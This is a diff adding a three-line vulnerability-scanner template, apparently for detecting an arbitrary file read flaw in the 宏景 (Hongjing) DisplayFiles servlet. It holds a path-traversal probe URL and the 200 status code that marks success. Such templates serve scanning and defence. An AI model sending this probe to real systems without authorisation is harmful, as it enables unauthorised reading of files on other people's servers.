@@ -1,0 +1,3 @@
+name: "宏景DisplayFiles任意文件读取"
+poc: "/templates/attestation/../../servlet/DisplayFiles"
+status_code: 200
